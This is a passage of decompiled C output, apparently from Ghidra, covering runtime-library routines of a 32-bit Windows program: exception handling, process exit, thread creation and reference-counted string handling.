  return;
}



bool FUN_00401cc8(undefined *param_1)

{
  short sVar1;
  
  if ((param_1 == &DAT_0040b1fc) || (param_1 == &DAT_0040b3c8)) {
    *(ushort *)(param_1 + 6) = (ushort)DAT_0040901c;
    FUN_00401558(param_1);
  }
  sVar1 = *(short *)(param_1 + 4);
  if (sVar1 != -0x284e) {
    FUN_004012dc(0x69);
  }
  return sVar1 == -0x284e;
}



void FUN_00401e24(void)

{
  return;
}



undefined4 FUN_00401e60(int param_1)

{
  return *(undefined4 *)(param_1 + -0x28);
}



void FUN_00401e68(int *param_1,char param_2,undefined4 param_3)

{
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_00000000;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  undefined4 in_stack_fffffff8;
  undefined4 in_stack_fffffffc;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00401f88((int)param_1,param_2,param_3,in_stack_fffffff0,in_stack_fffffff4,
                                  in_stack_fffffff8,in_stack_fffffffc);
    param_2 = extraout_DL;
  }
  if (param_2 != '\0') {
    FUN_00401fe0(param_1);
    *in_FS_OFFSET = in_stack_00000000;
  }
  return;
}



void FUN_00401e88(int *param_1,char param_2)

{
  int *piVar1;
  char extraout_DL;
  
  piVar1 = FUN_00401ff0(param_1,param_2);
  if ('\0' < extraout_DL) {
    FUN_00401fd8(piVar1);
  }
  return;
}



void FUN_00401e98(int *param_1)

{
  if (param_1 != (int *)0x0) {
    (**(code **)(*param_1 + -4))(param_1,1);
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x00401ed9)
// WARNING: Removing unreachable block (ram,0x00401edf)
// WARNING: Removing unreachable block (ram,0x00401ee6)
// WARNING: Removing unreachable block (ram,0x00401eec)
// WARNING: Removing unreachable block (ram,0x00401ef2)

void FUN_00401ea4(int param_1,int *param_2)

{
  uint uVar1;
  uint uVar2;
  int *piVar3;
  
  *param_2 = param_1;
  uVar2 = *(uint *)(param_1 + -0x28);
  uVar1 = uVar2 >> 2;
  piVar3 = param_2 + 1;
  while (uVar1 = uVar1 - 1, uVar1 != 0) {
    *piVar3 = 0;
    piVar3 = piVar3 + 1;
  }
  for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
    *(undefined *)piVar3 = 0;
    piVar3 = (int *)((int)piVar3 + 1);
  }
  for (; *(int **)(param_1 + -0x24) != (int *)0x0; param_1 = **(int **)(param_1 + -0x24)) {
  }
  return;
}



void FUN_00401efc(int *param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = param_1;
  do {
    iVar1 = *(int *)(*piVar2 + -0x40);
    piVar2 = *(int **)(*piVar2 + -0x24);
    if (iVar1 != 0) {
      FUN_00402e40((int)param_1,iVar1);
    }
  } while (piVar2 != (int *)0x0);
  return;
}



void FUN_00401f1c(int param_1)

{
  uint uVar1;
  ushort unaff_SI;
  ushort *puVar2;
  bool bVar3;
  
  do {
    puVar2 = *(ushort **)(param_1 + -0x30);
    if (puVar2 != (ushort *)0x0) {
      uVar1 = (uint)*puVar2;
      bVar3 = puVar2 + 1 == (ushort *)0x0;
      puVar2 = puVar2 + 1;
      do {
        if (uVar1 == 0) break;
        uVar1 = uVar1 - 1;
        bVar3 = unaff_SI == *puVar2;
        puVar2 = puVar2 + 1;
      } while (!bVar3);
      if (bVar3) {
        return;
      }
    }
    if (*(int **)(param_1 + -0x24) == (int *)0x0) {
      return;
    }
    param_1 = **(int **)(param_1 + -0x24);
  } while( true );
}



// WARNING: Variable defined which should be unmapped: param_6

void FUN_00401f88(int param_1,char param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
                 undefined4 param_6,undefined4 param_7)

{
  int *in_FS_OFFSET;
  
  if (-1 < param_2) {
    (**(code **)(param_1 + -0xc))();
  }
  *in_FS_OFFSET = (int)&param_4;
  return;
}



void FUN_00401fd8(int *param_1)

{
  (**(code **)(*param_1 + -8))();
  return;
}



int * FUN_00401fe0(int *param_1)

{
  (**(code **)(*param_1 + -0x1c))();
  return param_1;
}



int * FUN_00401ff0(int *param_1,char param_2)

{
  if (param_2 < '\x01') {
    return param_1;
  }
  (**(code **)(*param_1 + -0x18))();
  return param_1;
}



undefined4 FUN_0040201c(undefined4 param_1)

{
  if (DAT_00409014 != '\0') {
    (*DAT_0040b010)();
    param_1 = 2;
  }
  return param_1;
}



undefined4 FUN_00402040(void)

{
  (*DAT_0040b010)();
  return 0;
}



void FUN_00402058(void)

{
  if (1 < DAT_00409014) {
    FUN_00402040();
    return;
  }
  return;
}



int FUN_0040206c(int param_1,undefined4 param_2,char *param_3)

{
  if (((param_3 != (char *)0x0) && (param_1 = *(int *)(param_3 + 1), *param_3 != -0x17)) &&
     (*param_3 == -0x15)) {
    param_1 = (int)(char)param_1;
  }
  return param_1;
}



undefined4 * FUN_0040208c(undefined4 *param_1,undefined4 param_2,char *param_3)

{
  undefined4 uStack_10;
  char *pcStack_c;
  undefined4 uStack_8;
  undefined4 *puStack_4;
  
  if (1 < DAT_00409014) {
    uStack_10 = 0x40209d;
    pcStack_c = param_3;
    uStack_8 = param_2;
    puStack_4 = param_1;
    FUN_0040206c((int)param_1,param_2,param_3);
    param_1 = &uStack_10;
    (*DAT_0040b010)();
  }
  return param_1;
}



undefined4 FUN_004020d0(undefined4 param_1)

{
  if (1 < DAT_00409014) {
    (*DAT_0040b010)();
  }
  return param_1;
}



undefined4 FUN_004020f0(undefined param_1,undefined param_2,undefined param_3,int *param_4)

{
  int iVar1;
  LONG LVar2;
  int *piVar3;
  undefined4 *puVar4;
  undefined4 uVar5;
  int iVar6;
  int unaff_ESI;
  undefined4 *in_FS_OFFSET;
  PCONTEXT in_stack_00000008;
  undefined4 uStackY_34;
  PCONTEXT pCStackY_30;
  undefined4 uStackY_2c;
  int *piStackY_28;
  undefined4 uStackY_24;
  int iStackY_20;
  int iStackY_1c;
  int *piStackY_18;
  undefined4 uStackY_14;
  
  if ((param_4[1] & 6U) != 0) {
    return 1;
  }
  iVar1 = param_4[6];
  iVar6 = param_4[5];
  if (*param_4 != 0xeedfade) {
    FUN_00401e24();
    if (DAT_0040b00c == (code *)0x0) {
      return 1;
    }
    iVar1 = (*DAT_0040b00c)();
    if (iVar1 == 0) {
      return 1;
    }
    if (((*param_4 != 0xeefface) && (iVar1 = FUN_0040201c(iVar1), DAT_00409018 != 0)) &&
       (DAT_00409014 == '\0')) {
      LVar2 = UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&param_4);
      if (LVar2 == 0) {
        return 1;
      }
      iVar6 = param_4[3];
      piVar3 = param_4;
      goto LAB_004021a4;
    }
    iVar6 = param_4[3];
  }
  piVar3 = param_4;
  if ((1 < DAT_00409018) && (DAT_00409014 == '\0')) {
    uStackY_14 = 0x40219c;
    LVar2 = UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&param_4);
    if (LVar2 == 0) {
      return 1;
    }
  }
LAB_004021a4:
  piVar3[1] = piVar3[1] | 2;
  uStackY_14 = *in_FS_OFFSET;
  uStackY_24 = 0;
  uStackY_2c = 0x4021c8;
  pCStackY_30 = in_stack_00000008;
  uStackY_34 = 0x4021c8;
  piStackY_28 = piVar3;
  iStackY_20 = iVar6;
  iStackY_1c = iVar1;
  piStackY_18 = piVar3;
  (*DAT_0040b014)();
  uStackY_34 = 0x4021d1;
  puVar4 = (undefined4 *)FUN_00403598();
  uStackY_34 = *puVar4;
  *puVar4 = &uStackY_34;
  iVar1 = *(int *)(unaff_ESI + 4);
  *(undefined **)(unaff_ESI + 4) = &LAB_004021f4;
  FUN_00402058();
                    // WARNING: Could not recover jumptable at 0x004021f2. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar5 = (*(code *)(iVar1 + 5))();
  return uVar5;
}



undefined4
FUN_0040221c(undefined param_1,undefined param_2,undefined param_3,undefined4 *param_4,int param_5)

{
  int iVar1;
  code *extraout_ECX;
  
  if ((param_4[1] & 6) != 0) {
    iVar1 = *(int *)(param_5 + 4);
    *(undefined4 *)(param_5 + 4) = 0x40224c;
    FUN_0040208c(param_4,param_5,(char *)(iVar1 + 5));
    (*extraout_ECX)();
  }
  return 1;
}



void FUN_00402418(void)

{
  int iVar1;
  code *pcVar2;
  int iVar3;
  
  if (DAT_0040b5a4 != 0) {
    iVar1 = *(int *)(DAT_0040b5a4 + 4);
    iVar3 = DAT_0040b5a8;
    if (0 < DAT_0040b5a8) {
      do {
        iVar3 = iVar3 + -1;
        pcVar2 = *(code **)(iVar1 + 4 + iVar3 * 8);
        DAT_0040b5a8 = iVar3;
        if (pcVar2 != (code *)0x0) {
          (*pcVar2)();
        }
      } while (0 < iVar3);
    }
  }
  return;
}



void FUN_0040244c(int param_1,int param_2,int param_3)

{
  code *pcVar1;
  bool bVar2;
  
  bVar2 = (code *)PTR_FUN_00409034 == FUN_0040244c;
  if (param_2 < param_3) {
    do {
      pcVar1 = *(code **)(param_1 + param_2 * 8);
      param_2 = param_2 + 1;
      DAT_0040b5a8 = param_2;
      if (pcVar1 != (code *)0x0) {
        (*pcVar1)();
      }
      if ((bVar2) && ((code *)PTR_FUN_00409034 != FUN_0040244c)) {
        (*(code *)PTR_FUN_00409034)(param_1,param_2,param_3);
        return;
      }
    } while (param_2 < param_3);
  }
  return;
}



void FUN_004024a0(void)

{
  if (DAT_0040b5a4 != (undefined4 *)0x0) {
    (*(code *)PTR_FUN_00409034)(DAT_0040b5a4[1],0,*DAT_0040b5a4);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004024bc(undefined4 param_1,int param_2)

{
  DAT_0040b010 = &DAT_00401108;
  DAT_0040b014 = &DAT_00401118;
  DAT_0040b5a8 = 0;
  _DAT_0040b01c = *(undefined4 *)(param_2 + 4);
  DAT_0040b024 = 0;
  DAT_0040b5a4 = param_1;
  DAT_0040b5ac = param_2;
  FUN_004024a0();
  return;
}



// WARNING: Unable to track spacebase fully for stack

bool FUN_004024f8(void)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  iVar1 = DAT_00409000;
  LOCK();
  DAT_00409000 = 0;
  UNLOCK();
  puVar3 = DAT_0040b59c;
  puVar4 = &DAT_0040b59c;
  for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  return (bool)('\x01' - (iVar1 != 0));
}



void FUN_00402528(void)

{
  HMODULE hLibModule;
  code *pcVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  byte bVar5;
  
  bVar5 = 0;
  if ((DAT_0040b5c4 == 0) && (DAT_0040b028 != (code *)0x0)) {
    do {
      pcVar1 = DAT_0040b028;
      DAT_0040b028 = (code *)0x0;
      (*pcVar1)();
    } while (DAT_0040b028 != (code *)0x0);
  }
  if (DAT_00409004 != 0) {
    (*(code *)PTR_FUN_00409090)();
  }
  while( true ) {
    if ((DAT_0040b5c4 == 2) && (DAT_00409000 == 0)) {
      DAT_0040b5a8 = 0;
    }
    (*(code *)PTR_FUN_00409038)();
    if (((DAT_0040b5c4 < 2) || (DAT_00409000 != 0)) && (DAT_0040b5ac != 0)) {
      (*(code *)PTR_FUN_00409028)();
      hLibModule = *(HMODULE *)(DAT_0040b5ac + 0x10);
      if ((hLibModule != *(HMODULE *)(DAT_0040b5ac + 4)) && (hLibModule != (HMODULE)0x0)) {
        FreeLibrary(hLibModule);
      }
    }
    (*(code *)PTR_FUN_0040903c)();
    if (DAT_0040b5c4 == 1) {
      (*DAT_0040b5c0)();
    }
    if (DAT_0040b5c4 != 0) {
      FUN_004024f8();
    }
    if (DAT_0040b59c == (undefined4 *)0x0) break;
    puVar3 = DAT_0040b59c;
    puVar4 = &DAT_0040b59c;
    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *puVar3;
      puVar3 = puVar3 + (uint)bVar5 * -2 + 1;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
  }
  if (DAT_0040b018 != (code *)0x0) {
    (*DAT_0040b018)();
  }
                    // WARNING: Subroutine does not return
  ExitProcess(DAT_00409000);
}



void FUN_004025f8(undefined4 param_1)

{
  DAT_00409000 = param_1;
  FUN_00402528();
  return;
}



void FUN_00402604(undefined4 param_1)

{
  undefined4 in_stack_00000000;
  
  DAT_00409004 = in_stack_00000000;
  FUN_004025f8(param_1);
  return;
}



void FUN_00402610(undefined param_1,undefined param_2,undefined param_3,code **param_4)

{
  code *pcVar1;
  code *pcVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_10;
  undefined *puStack_c;
  undefined *puStack_8;
  
  puStack_8 = (undefined *)0x402618;
  FUN_00401e24();
  puStack_c = &LAB_00402378;
  uStack_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_10;
  pcVar1 = param_4[1];
  pcVar2 = *param_4;
  puStack_8 = &stack0xfffffffc;
  FUN_004011f0((int)param_4);
  (*pcVar2)(pcVar1);
  *in_FS_OFFSET = uStack_10;
  return;
}



void FUN_00402648(LPSECURITY_ATTRIBUTES param_1,SIZE_T param_2,undefined4 param_3,LPDWORD param_4,
                 DWORD param_5,undefined4 param_6)

{
  undefined4 *lpParameter;
  
  lpParameter = (undefined4 *)FUN_004011d8(8);
  *lpParameter = param_3;
  lpParameter[1] = param_6;
  DAT_0040b02c = 1;
  CreateThread(param_1,param_2,FUN_00402610,lpParameter,param_5,param_4);
  return;
}



int * FUN_0040268c(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  if ((iVar2 != 0) && (*param_1 = 0, 0 < *(int *)(iVar2 + -8))) {
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004011f0(iVar2 + -8);
    }
  }
  return param_1;
}



void FUN_004026b0(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  
  do {
    iVar2 = *param_1;
    if ((iVar2 != 0) && (*param_1 = 0, 0 < *(int *)(iVar2 + -8))) {
      piVar1 = (int *)(iVar2 + -8);
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004011f0(iVar2 + -8);
      }
    }
    param_1 = param_1 + 1;
    param_2 = param_2 + -1;
  } while (param_2 != 0);
  return;
}



void FUN_004026e0(int *param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  
  if (param_2 != (undefined4 *)0x0) {
    iVar2 = param_2[-2];
    if (iVar2 == -1 || SCARRY4(iVar2,1) != iVar2 + 1 < 0) {
      puVar3 = FUN_0040274c(param_2[-1]);
      FUN_00401318(param_2,puVar3,(undefined4 *)param_2[-1]);
      param_2 = puVar3;
    }
    else {
      param_2[-2] = param_2[-2] + 1;
    }
  }
  LOCK();
  iVar2 = *param_1;
  *param_1 = (int)param_2;
  UNLOCK();
  if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004011f0(iVar2 + -8);
    }
  }
  return;
}



void FUN_00402724(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  
  if ((param_2 != 0) &&
     (iVar2 = *(int *)(param_2 + -8), iVar2 != -1 && SCARRY4(iVar2,1) == iVar2 + 1 < 0)) {
    *(int *)(param_2 + -8) = *(int *)(param_2 + -8) + 1;
  }
  LOCK();
  iVar2 = *param_1;
  *param_1 = param_2;
  UNLOCK();
  if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004011f0(iVar2 + -8);
    }
  }
  return;
}



undefined4 * FUN_0040274c(int param_1)

{
  uint uVar1;
  undefined4 *puVar2;
  
  if (0 < param_1) {
    uVar1 = param_1 + 10U & 0xfffffffe;
    puVar2 = (undefined4 *)FUN_004011d8(uVar1);
    *(undefined2 *)((uVar1 - 2) + (int)puVar2) = 0;
    puVar2[1] = param_1;
    *puVar2 = 1;
    return puVar2 + 2;
  }
  return (undefined4 *)0x0;
}



void FUN_00402778(int *param_1,undefined4 *param_2,undefined4 *param_3)

{
  undefined4 *puVar1;
  
  puVar1 = FUN_0040274c((int)param_3);
  if (param_2 != (undefined4 *)0x0) {
    FUN_00401318(param_2,puVar1,param_3);
  }
  FUN_0040268c(param_1);
  *param_1 = (int)puVar1;
  return;
}



void FUN_004027a8(LPSTR param_1,int param_2,LPCWSTR param_3,int param_4)

{
  WideCharToMultiByte(0,0,param_3,param_4,param_1,param_2,(LPCSTR)0x0,(LPBOOL)0x0);
  return;
}



void FUN_004027c4(LPWSTR param_1,int param_2,LPCSTR param_3,int param_4)

{
  MultiByteToWideChar(0,0,param_3,param_4,param_1,param_2);
  return;
}



void FUN_004027dc(LPSTR *param_1,LPCWSTR param_2,int param_3)

{
  undefined4 *puVar1;
  LPSTR *local_1010 [1024];
  
  local_1010[0] = param_1;
  if (param_3 < 1) {
    FUN_0040268c((int *)param_1);
  }
  else {
    if ((param_3 + 1 < 0x7ff) &&
       (puVar1 = (undefined4 *)FUN_004027a8((LPSTR)local_1010,0xfff,param_2,param_3),
       -1 < (int)puVar1)) {
      FUN_00402778((int *)param_1,local_1010,puVar1);
      return;
    }
    puVar1 = (undefined4 *)((param_3 + 1) * 2);
    FUN_00402cac((int *)param_1,puVar1);
    puVar1 = (undefined4 *)FUN_004027a8(*param_1,(int)puVar1,param_2,param_3);
    if ((int)puVar1 < 0) {
      puVar1 = (undefined4 *)0x0;
    }
    FUN_00402cac((int *)param_1,puVar1);
  }
  return;
}



void FUN_00402868(int *param_1,undefined4 param_2)

{
  undefined4 uStack_4;
  
  uStack_4 = param_2;
  FUN_00402778(param_1,&uStack_4,(undefined4 *)0x1);
  return;
}



void FUN_00402878(int *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  
  puVar1 = (undefined4 *)0x0;
  puVar2 = param_2;
  if (param_2 != (undefined4 *)0x0) {
    for (; *(char *)puVar2 != '\0'; puVar2 = puVar2 + 1) {
      if (*(char *)((int)puVar2 + 1) == '\0') {
LAB_00402899:
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        break;
      }
      if (*(char *)((int)puVar2 + 2) == '\0') {
LAB_00402898:
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        goto LAB_00402899;
      }
      if (*(char *)((int)puVar2 + 3) == '\0') {
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        goto LAB_00402898;
      }
    }
    puVar1 = (undefined4 *)((int)puVar2 - (int)param_2);
  }
  FUN_00402778(param_1,param_2,puVar1);
  return;
}



void FUN_004028a8(LPSTR *param_1,LPCWSTR param_2)

{
  uint uVar1;
  LPCWSTR pWVar2;
  
  uVar1 = 0;
  pWVar2 = param_2;
  if (param_2 != (LPCWSTR)0x0) {
    for (; *pWVar2 != L'\0'; pWVar2 = pWVar2 + 4) {
      if (pWVar2[1] == L'\0') {
LAB_004028d1:
        pWVar2 = pWVar2 + 1;
        break;
      }
      if (pWVar2[2] == L'\0') {
LAB_004028ce:
        pWVar2 = pWVar2 + 1;
        goto LAB_004028d1;
      }
      if (pWVar2[3] == L'\0') {
        pWVar2 = pWVar2 + 1;
        goto LAB_004028ce;
      }
    }
    uVar1 = (uint)((int)pWVar2 - (int)param_2) >> 1;
  }
  FUN_004027dc(param_1,param_2,uVar1);
  return;
}



void FUN_004028e4(int *param_1,byte *param_2)

{
  FUN_00402778(param_1,(undefined4 *)(param_2 + 1),(undefined4 *)(uint)*param_2);
  return;
}



void FUN_004028f0(int *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  undefined4 *puVar2;
  bool bVar3;
  
  bVar3 = true;
  uVar1 = param_3;
  puVar2 = param_2;
  do {
    if (uVar1 == 0) break;
    uVar1 = uVar1 - 1;
    bVar3 = *(char *)puVar2 == '\0';
    puVar2 = (undefined4 *)((int)puVar2 + 1);
  } while (!bVar3);
  if (bVar3) {
    uVar1 = ~uVar1;
  }
  FUN_00402778(param_1,param_2,(undefined4 *)(uVar1 + param_3));
  return;
}



void FUN_00402908(undefined *param_1,undefined4 *param_2,undefined4 *param_3)

{
  undefined4 *puVar1;
  
  if ((param_2 != (undefined4 *)0x0) &&
     (puVar1 = (undefined4 *)param_2[-1], puVar1 != (undefined4 *)0x0)) {
    if ((int)puVar1 <= (int)param_3) {
      param_3 = puVar1;
    }
    *param_1 = (char)param_3;
    FUN_00401318(param_2,(undefined4 *)(param_1 + 1),param_3);
    return;
  }
  *param_1 = 0;
  return;
}



int FUN_0040292c(int param_1)

{
  if (param_1 != 0) {
    param_1 = *(int *)(param_1 + -4);
  }
  return param_1;
}



void FUN_00402934(int *param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  if (param_2 == (undefined4 *)0x0) {
    return;
  }
  puVar4 = (undefined4 *)*param_1;
  if (puVar4 != (undefined4 *)0x0) {
    puVar3 = (undefined4 *)puVar4[-1];
    if (param_2 == puVar4) {
      FUN_00402cac(param_1,(undefined4 *)(param_2[-1] + (int)puVar3));
      param_2 = (undefined4 *)*param_1;
      puVar4 = puVar3;
    }
    else {
      FUN_00402cac(param_1,(undefined4 *)(param_2[-1] + (int)puVar3));
      puVar4 = (undefined4 *)param_2[-1];
    }
    FUN_00401318(param_2,(undefined4 *)(*param_1 + (int)puVar3),puVar4);
    return;
  }
  if (param_2 != (undefined4 *)0x0) {
    iVar2 = param_2[-2];
    if (iVar2 == -1 || SCARRY4(iVar2,1) != iVar2 + 1 < 0) {
      puVar4 = FUN_0040274c(param_2[-1]);
      FUN_00401318(param_2,puVar4,(undefined4 *)param_2[-1]);
      param_2 = puVar4;
    }
    else {
      param_2[-2] = param_2[-2] + 1;
    }
  }
  LOCK();
  iVar2 = *param_1;
  *param_1 = (int)param_2;
  UNLOCK();
  if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004011f0(iVar2 + -8);
    }
  }
  return;
}



void FUN_00402978(int *param_1,undefined4 *param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  
  if (param_2 == (undefined4 *)0x0) {
    FUN_004026e0(param_1,param_3);
    return;
  }
  if (param_3 == (undefined4 *)0x0) {
    if (param_2 != (undefined4 *)0x0) {
      iVar2 = param_2[-2];
      if (iVar2 == -1 || SCARRY4(iVar2,1) != iVar2 + 1 < 0) {
        puVar3 = FUN_0040274c(param_2[-1]);
        FUN_00401318(param_2,puVar3,(undefined4 *)param_2[-1]);
        param_2 = puVar3;
      }
      else {
        param_2[-2] = param_2[-2] + 1;
      }
    }
    LOCK();
    iVar2 = *param_1;
    *param_1 = (int)param_2;
    UNLOCK();
    if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
      piVar1 = (int *)(iVar2 + -8);
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004011f0(iVar2 + -8);
      }
    }
    return;
  }
  if (param_2 == (undefined4 *)*param_1) {
    FUN_00402934(param_1,param_3);
    return;
  }
  if (param_3 != (undefined4 *)*param_1) {
    FUN_004026e0(param_1,param_2);
    FUN_00402934(param_1,param_3);
    return;
  }
  puVar3 = FUN_0040274c(param_2[-1] + param_3[-1]);
  FUN_00401318(param_2,puVar3,(undefined4 *)param_2[-1]);
  FUN_00401318(param_3,(undefined4 *)((int)puVar3 + param_2[-1]),(undefined4 *)param_3[-1]);
  if (puVar3 != (undefined4 *)0x0) {
    puVar3[-2] = puVar3[-2] + -1;
  }
  FUN_004026e0(param_1,puVar3);
  return;
}



void FUN_004029ec(int *param_1,int param_2)

{
  undefined4 *puVar1;
  int *piVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  code *UNRECOVERED_JUMPTABLE;
  int *piStack_18;
  
  piVar5 = (int *)0x0;
  if ((*(int *)(&stack0x00000000 + param_2 * 4) != 0) &&
     (*param_1 == *(int *)(&stack0x00000000 + param_2 * 4))) {
    piVar5 = param_1;
  }
  puVar1 = (undefined4 *)0x0;
  iVar3 = param_2;
  do {
    piVar2 = *(int **)(&stack0x00000000 + iVar3 * 4);
    if ((piVar2 != (int *)0x0) &&
       (puVar1 = (undefined4 *)((int)puVar1 + piVar2[-1]), piVar5 == piVar2)) {
      piVar5 = (int *)0x0;
    }
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  if (piVar5 == (int *)0x0) {
    piVar2 = FUN_0040274c((int)puVar1);
    piStack_18 = piVar2;
  }
  else {
    iVar3 = *(int *)(*piVar5 + -4);
    FUN_00402cac(piVar5,puVar1);
    param_2 = param_2 + -1;
    piVar2 = (int *)(iVar3 + *piVar5);
    piStack_18 = piVar5;
  }
  do {
    puVar1 = *(undefined4 **)(&stack0x00000000 + param_2 * 4);
    piVar4 = piVar2;
    if (puVar1 != (undefined4 *)0x0) {
      piVar4 = (int *)((int)piVar2 + (int)(undefined4 *)puVar1[-1]);
      FUN_00401318(puVar1,piVar2,(undefined4 *)puVar1[-1]);
    }
    param_2 = param_2 + -1;
    piVar2 = piVar4;
  } while (param_2 != 0);
  if (piVar5 == (int *)0x0) {
    if (piStack_18 != (int *)0x0) {
      piStack_18[-2] = piStack_18[-2] + -1;
    }
    FUN_004026e0(param_1,piStack_18);
  }
                    // WARNING: Could not recover jumptable at 0x00402a6a. Too many branches
                    // WARNING: Treating indirect jump as call
  (*UNRECOVERED_JUMPTABLE)(UNRECOVERED_JUMPTABLE);
  return;
}



uint * FUN_00402a70(uint *param_1,uint *param_2)

{
  uint uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 != param_2) {
    if (param_1 == (uint *)0x0) {
      param_1 = (uint *)-param_2[-1];
    }
    else if (param_2 == (uint *)0x0) {
      param_1 = (uint *)param_1[-1];
    }
    else {
      uVar3 = param_2[-1];
      puVar2 = (uint *)(param_1[-1] - uVar3);
      if (param_1[-1] < uVar3 || puVar2 == (uint *)0x0) {
        uVar3 = uVar3 + (int)puVar2;
      }
      for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 2) {
        if (*param_1 != *param_2) {
          return puVar2;
        }
        if (uVar4 == 1) {
          param_1 = param_1 + 1;
          param_2 = param_2 + 1;
          break;
        }
        if (param_1[1] != param_2[1]) {
          return puVar2;
        }
        param_1 = param_1 + 2;
        param_2 = param_2 + 2;
      }
      uVar3 = uVar3 & 3;
      if (uVar3 != 0) {
        uVar4 = *param_1;
        uVar1 = *param_2;
        if ((char)uVar4 != (char)uVar1) {
          return puVar2;
        }
        if (uVar3 != 1) {
          if ((char)(uVar4 >> 8) != (char)(uVar1 >> 8)) {
            return puVar2;
          }
          if ((uVar3 != 2) && ((uVar4 & 0xff0000) != (uVar1 & 0xff0000))) {
            return puVar2;
          }
        }
      }
      param_1 = (uint *)((int)puVar2 * 2);
    }
  }
  return param_1;
}



void FUN_00402b14(int param_1)

{
  int iVar1;
  
  if ((param_1 != 0) &&
     (iVar1 = *(int *)(param_1 + -8), iVar1 != -1 && SCARRY4(iVar1,1) == iVar1 + 1 < 0)) {
    *(int *)(param_1 + -8) = *(int *)(param_1 + -8) + 1;
  }
  return;
}



undefined * FUN_00402b24(undefined *param_1)

{
  if (param_1 != (undefined *)0x0) {
    return param_1;
  }
  return &DAT_00402b29;
}



int FUN_00402b30(int *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar4 = *param_1;
  if ((iVar4 != 0) && (*(int *)(iVar4 + -8) != 1)) {
    puVar3 = FUN_0040274c(*(int *)(iVar4 + -4));
    puVar2 = (undefined4 *)*param_1;
    *param_1 = (int)puVar3;
    FUN_00401318(puVar2,puVar3,(undefined4 *)puVar2[-1]);
    if (0 < (int)puVar2[-2]) {
      piVar1 = puVar2 + -2;
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004011f0((int)(puVar2 + -2));
      }
    }
    iVar4 = *param_1;
  }
  return iVar4;
}



int thunk_FUN_00402b30(int *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar4 = *param_1;
  if ((iVar4 != 0) && (*(int *)(iVar4 + -8) != 1)) {
    puVar3 = FUN_0040274c(*(int *)(iVar4 + -4));
    puVar2 = (undefined4 *)*param_1;
    *param_1 = (int)puVar3;
    FUN_00401318(puVar2,puVar3,(undefined4 *)puVar2[-1]);
    if (0 < (int)puVar2[-2]) {
      piVar1 = puVar2 + -2;
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004011f0((int)(puVar2 + -2));
      }
    }
    iVar4 = *param_1;
  }
  return iVar4;
}



int thunk_FUN_00402b30(int *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar4 = *param_1;
  if ((iVar4 != 0) && (*(int *)(iVar4 + -8) != 1)) {
    puVar3 = FUN_0040274c(*(int *)(iVar4 + -4));
    puVar2 = (undefined4 *)*param_1;
    *param_1 = (int)puVar3;
    FUN_00401318(puVar2,puVar3,(undefined4 *)puVar2[-1]);
    if (0 < (int)puVar2[-2]) {
      piVar1 = puVar2 + -2;
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004011f0((int)(puVar2 + -2));
      }
    }
    iVar4 = *param_1;
  }
  return iVar4;
}



